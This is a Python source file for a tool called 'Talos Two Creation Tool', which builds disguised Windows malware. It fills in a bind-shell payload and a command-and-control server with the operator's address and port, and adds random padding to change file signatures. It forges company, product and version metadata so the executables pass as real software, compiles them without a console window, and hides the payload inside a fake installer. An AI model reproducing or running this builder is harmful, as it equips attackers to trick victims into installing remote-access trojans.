# Declare imports
import subprocess
import shutil
import random
import string
import os
import binascii

def InstallSettings(targetOS):
    sigPort = ''
    signatureList = os.listdir("../prebuit/Windows/")
    CodeAnswer = input("Do you want to use specific install settings?: ")

    if CodeAnswer == "yes":
        os.system('clear')
        i = 1
        for f in signatureList:
            if f.endswith(".txt"):
                print(i, ". ",f)
                i= i + 1
        x = int(input("Enter a number: "))
        signatureChoice = signatureList[x - 1]
    elif CodeAnswer == "no":
        print("Using randomly chosen company sig")
        signatureChoice = (random.choice(signatureList))
    else:
        print("Please enter yes or no.")

    signatureChoice =''.join(("../prebuit/Windows/", signatureChoice))

    with open(signatureChoice, "r") as ifile:
        for line in ifile:
            if line.startswith("[Installer Name: Used for packaging DONT INCLUDE EXE]"):
                sigInstallerName = (next(ifile, '').strip('\n'))
            if line.startswith("[Installer Description]"):
                sigInstallerDescript = (next(ifile, '').strip('\n'))
            if line.startswith("[Main File Name: The Main Malware DONT INCLUDE EXE]"):
                sigFileName = (next(ifile, '').strip('\n'))
            if line.startswith("[Product Name]"):
                sigProduct = (next(ifile, '').strip('\n'))
            if line.startswith("[File Description]"):
                sigDescript = (next(ifile, '').strip('\n'))
            if line.startswith("[Software Version]"):
                sigVersion = (next(ifile, '').strip('\n'))
            if line.startswith("[Company Name]"):
                sigSigner = (next(ifile, '').strip('\n'))
            if line.startswith("[PORT]"):
                sigPort = (next(ifile, '').strip('\n'))
            if line.startswith("[InstallLocation]"):
                sigInstallLocation = (next(ifile, '').strip('\n'))
            if line.startswith("[Real Installer Download]"):
                sigDownloadLink = (next(ifile, '').strip('\n'))



    return (sigInstallerName, sigInstallerDescript, sigFileName, sigProduct, sigDescript, sigVersion, sigSigner, sigPort, sigInstallLocation, sigDownloadLink)

def connectionSettings(sigPort):
    CommandServerAddress = input("Please enter your domain/ip address (ie. 192.168.1.2 or 10.10.10.4 or example.org): ")

    if sigPort != "":
        print("Looks like the prebuilt script included a specific port ", sigPort)
        portChangeAnswer = input("Do you want to change it to a custom port?: ")
        if portChangeAnswer == "yes":
            CommandServerPort = input("Please enter your custom server port (ie. 1111, 443, 80, 445): ")
        elif portChangeAnswer == "no":
            print("Excellent using prebuilt port ", sigPort)
            CommandServerPort = sigPort
        else:
            print("Please enter yes or no.")
    else:
        CommandServerPort = input("Please enter your command server port (ie. 1111, 443, 80, 445): ")

    return CommandServerAddress, CommandServerPort

def printSettings(CommandServerAddress, CommandServerPort, sigInstallerName, sigInstallerDescript, sigFileName, sigProduct, sigDescript, sigVersion, sigSigner, sigPort, sigInstallLocation):
    print("The following settings have been saved:")
    print("Host: ", CommandServerAddress)
    print("C2 port: ", CommandServerPort)
    print("")
    print("Install location: ", sigInstallLocation)
    print("")
    print("The installer is called: ", sigInstallerName)
    print("The actual payload is called: ", sigFileName)
    print("")
    print("Company Signature: ")
    # Behold a crime against proper code etiquette
    print(sigInstallerDescript)
    print(sigFileName)
    print(sigProduct)
    print(sigDescript)
    print(sigVersion)
    print(sigSigner)
    return

def buildprep(sigInstallLocation, sigInstallerName, sigProduct, CommandServerAddress,CommandServerPort, sigFileName, targetOS, sigDownloadLink):
    copyShellTo = ''.join(('../build/',sigFileName, ".py"))
    shutil.copy('../src/payload/bindshell.py', copyShellTo)

    copyCommanderTo = ''.join(('../build/commander',sigFileName, ".py"))
    shutil.copy('../src/server/server.py', copyCommanderTo)

    copyInstaller = ''.join(('../src/installers/', targetOS, "/AdminInstaller.py"))
    copyInstallerTo = ''.join(('../build/', sigInstallerName, ".py"))
    shutil.copy(copyInstaller, copyInstallerTo)
    
    #Really need two of these, but for the first rlease I'll leave it as one and forget this comment. Like a real dev would.
    filePaddinglength = random.randint(200000,1400000)
    filePadding = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for i in range(filePaddinglength))

#Change payload varaibles
    with open(copyShellTo) as f:
        replaceC2Address = f.read().replace('IPORDOMAIN', CommandServerAddress)
    with open(copyShellTo, "w") as f:
        f.write(replaceC2Address)

    with open(copyShellTo) as f:
        replaceC2Port = f.read().replace('CONTROLPORT', CommandServerPort)
    with open(copyShellTo, "w") as f:
        f.write(replaceC2Port)

    with open(copyShellTo) as f:
        replacePadding= f.read().replace('RANDOPADDDING', filePadding)
    with open(copyShellTo, "w") as f:
        f.write(replacePadding)


#Change Installer varaibles
    with open(copyInstallerTo) as f:
        replaceProdName = f.read().replace('ProductName', sigProduct)
    with open(copyInstallerTo, "w") as f:
        f.write(replaceProdName)

    with open(copyInstallerTo) as f:
        replaceInstallPath = f.read().replace('sigInstallLocation', sigInstallLocation)
    with open(copyInstallerTo, "w") as f:
        f.write(replaceInstallPath)

    with open(copyInstallerTo) as f:
        replaceInstallerName = f.read().replace('INSTALLERNAMEHERE', sigInstallerName)
    with open(copyInstallerTo, "w") as f:
        f.write(replaceInstallerName)

    with open(copyInstallerTo) as f:
        replaceProgName = f.read().replace('sigFileName', sigFileName)
    with open(copyInstallerTo, "w") as f:
        f.write(replaceProgName)

    with open(copyInstallerTo) as f:
        replacePadding = f.read().replace('RANDOPADDDING', filePadding)
    with open(copyInstallerTo, "w") as f:
        f.write(replacePadding)

    with open(copyInstallerTo) as f:
        replaceDownloadLink = f.read().replace('DOWNLOADLINK', sigDownloadLink)
    with open(copyInstallerTo, "w") as f:
        f.write(replaceDownloadLink)

# Change Controller Settings
    with open(copyCommanderTo) as f:
        replaceC2Address = f.read().replace('IPORDOMAIN', CommandServerAddress)
    with open(copyCommanderTo, "w") as f:
        f.write(replaceC2Address)

    with open(copyCommanderTo) as f:
        replaceC2Port = f.read().replace('CONTROLPORT', CommandServerPort)
    with open(copyCommanderTo, "w") as f:
        f.write(replaceC2Port)

    return

def WindowsBuild(sigInstallerName, sigInstallerDescript, sigFileName, sigProduct, sigDescript, sigVersion, sigSigner):

    BuildMainProg = ''.join((r'WINEPREFIX=~/.wine64 WINARCH=win64 wine nuitka3 --onefile --windows-onefile-tempdir --windows-product-name="', sigProduct,'" --windows-file-description="', sigDescript,'" --windows-file-version="', sigVersion,'" --windows-company-name="', sigSigner,'" --windows-disable-console ../build/',sigFileName,'.py'))
    os.system(BuildMainProg)
    MainProgPath = ''.join(('../build/',sigFileName,'.exe'))
    InstallerPyPath = ''.join(('../build/', sigInstallerName, ".py"))
    with open(MainProgPath, mode='rb') as file:
        MainProgCode = binascii.hexlify(file.read())
    with open(InstallerPyPath, mode='rb') as f:
        InstallerPyPathContent= f.read()
        replaceMainProgCode = InstallerPyPathContent.replace(b'RAWCODETOREPLACE', MainProgCode)
    with open(InstallerPyPath, mode='wb') as f:
        f.write(replaceMainProgCode)

    BuildInstallerProg = ''.join((r'WINEPREFIX=~/.wine64 WINARCH=win64 wine nuitka3 --onefile --windows-onefile-tempdir --windows-product-name="', sigProduct,'" --windows-file-description="', sigInstallerDescript,'" --windows-file-version="', sigVersion,'" --windows-company-name="', sigSigner,'" --windows-disable-console ../build/',sigInstallerName,'.py'))
    os.system(BuildInstallerProg)
    return


def copyToOutput(sigInstallerName, sigFileName):
    copyPayloadExe = ''.join(('../build/',sigFileName, ".exe"))
    copyInstallerExe = ''.join(('../build/',sigInstallerName, ".exe"))
    copyCommander = ''.join(('../build/commander', sigFileName, ".py"))
    OutputPath = ''.join(('../Output/'))
    shutil.copy(copyPayloadExe, OutputPath)
    shutil.copy(copyInstallerExe, OutputPath)
    shutil.copy(copyCommander, OutputPath)
    ClearBuild = ''.join(("rm -rf ../build/*"))
    os.system(ClearBuild)
    return


def mainMenu():
    print ("Talos Two Creation Tool")
    print("1. Windows")
    print("2. Linux")
    print("3. macOS")
    print("4. Quit")

    menu = input("Please enter a number: ")
    if (menu) == "1":
        targetOS = "Windows"
        sigInstallerName, sigInstallerDescript, sigFileName, sigProduct, sigDescript, sigVersion, sigSigner, sigPort, sigInstallLocation, sigDownloadLink = InstallSettings(targetOS)
        CommandServerAddress, CommandServerPort = connectionSettings(sigPort)
        printSettings(CommandServerAddress, CommandServerPort, sigInstallerName, sigInstallerDescript, sigFileName, sigProduct, sigDescript, sigVersion, sigSigner, sigPort, sigInstallLocation)
        buildprep(sigInstallLocation, sigInstallerName, sigProduct, CommandServerAddress,CommandServerPort, sigFileName, targetOS, sigDownloadLink)
        WindowsBuild(sigInstallerName, sigInstallerDescript, sigFileName, sigProduct, sigDescript, sigVersion, sigSigner)
    elif (menu) == "2":
        targetOS = "Linux"
        CommandServerAddress,CommandServerPort = connectionSettings()
        sigFileName, sigProduct, sigDescript, sigVersion, sigSigner = InstallSettings()
    elif (menu) == "3":
        print ("needs work")
        exit()
    elif (menu) == "4":
        print("Goodbye")
        exit()
    return(sigInstallerName, sigFileName, targetOS)






os.system('clear')

#Main
sigInstallerName, sigFileName, targetOS = mainMenu()
os.system('clear')
copyToOutput(sigInstallerName, sigFileName)
os.system('clear')



